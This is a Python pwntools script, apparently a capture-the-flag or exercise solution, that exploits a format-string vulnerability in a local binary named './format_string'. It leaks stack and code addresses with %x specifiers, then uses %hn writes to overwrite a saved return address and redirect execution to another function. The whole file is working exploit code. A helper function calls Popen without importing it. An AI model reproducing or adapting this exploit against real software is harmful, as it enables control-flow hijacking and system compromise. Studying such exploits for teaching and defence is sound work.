#!/usr/bin/env python3

import sys
from pwnlib.tubes.process import process

def xxd(str):
    with Popen('xxd', stdin=PIPE) as p:
        p.stdin.write(bytes(str, 'utf-8'))

def to_le(num):
    return num.to_bytes(4, 'little')

esp_to_ebp = 74
esp_to_ret = esp_to_ebp + 1
esp_to_buf1 = 7
esp_to_buf2 = 39
main_ret_to_unavailable = -210
old_fb_to_vuln_ret = -12

executable = './format_string'
format_string = '%{}$08x %{}$08x'.format(str(esp_to_ebp), str(esp_to_ret))

p = process(executable)
p.sendline(bytes(format_string, 'utf-8'))
stack, code = p.read().decode().strip('\n').split(' ')
print(stack, code)

stack_int = int('0x' + stack, 16)
ret_int = stack_int + old_fb_to_vuln_ret
ret1 = ret_int.to_bytes(4, 'little')
ret2 = (ret_int + 2).to_bytes(4, 'little')

code_int = int('0x' + code, 16)
func_addr = code_int + main_ret_to_unavailable
low_num = func_addr & 0xffff
high_num = (func_addr >> 16) & 0xffff
low = low_num.to_bytes(2, 'little')
high = high_num.to_bytes(2, 'little')
func_addr = low + high

high_num -= low_num
while(low_num < 8):
    low_num += 0x10000
while(high_num < 8):
    high_num += 0x10000

format_string = '%{}x%{}$hn%{}x%{}$hn'.format(low_num, esp_to_buf2, high_num, esp_to_buf2 + 1)

payload = ret1 + ret2
payload += bytes(format_string, 'utf-8')
print(payload)

p.sendline(payload)

out = p.recvall()
out = out.replace(b' ', b'')
print(out)
print(p.returncode)
